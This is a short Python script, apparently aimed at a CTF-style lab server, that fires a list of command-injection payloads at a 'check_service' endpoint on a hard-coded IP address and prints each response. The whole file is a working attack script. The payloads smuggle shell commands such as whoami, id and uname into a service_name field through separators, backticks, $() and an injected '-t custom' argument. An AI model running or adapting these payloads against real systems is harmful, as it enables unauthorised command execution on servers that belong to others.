import requests

url = "http://13.36.65.25:32777/check_service"

# Blank payload to determine legitimate use
payloads = [
    {"service_name": ""},
    {"service_name": "apache; whoami"},
    {"service_name": "mysql && whoami"},
    {"service_name": "nginx | whoami"},
    {"service_name": "ssh `whoami`"},
    {"service_name": "apache $(whoami)"},
    {"service_name": "mysql `whoami`"},
    {"service_name": "nginx $(whoami)"},
    {"service_name": "ssh; whoami"},
    {"service_name": "apache && whoami"},
    {"service_name": "mysql | whoami"},
    {"service_name": "nginx; whoami"},
    {"service_name": "ssh && whoami"},
    {"service_name": "apache | whoami"},
    {"service_name": "mysql; whoami"},
    {"service_name": "nginx && whoami"},
    {"service_name": "ssh | whoami"},
    {"service_name": "apache `whoami`"},
    {"service_name": "mysql $(whoami)"},
    {"service_name": "nginx `whoami`"},
    {"service_name": "ssh $(whoami)"},
    {"service_name": "-t custom 'whoami'"},
    {"service_name": "-t custom 'uname -n'"},
    {"service_name": "-t custom 'hostname'"},
    {"service_name": "-t custom 'id'"},
    {"service_name": "-t custom 'echo $USER'"},
    {"service_name": "-t custom 'whoami; uname -a'"},
    {"service_name": "-t custom 'whoami && id'"},
    {"service_name": "-t custom 'whoami | grep root'"},
    {"service_name": "-t custom 'whoami; echo done'"},
    {"service_name": "-t custom 'whoami && echo done'"},
]

for payload in payloads:
    response = requests.post(url, json=payload)
    print(f"Payload: {payload['service_name']}, Response: {response.text}")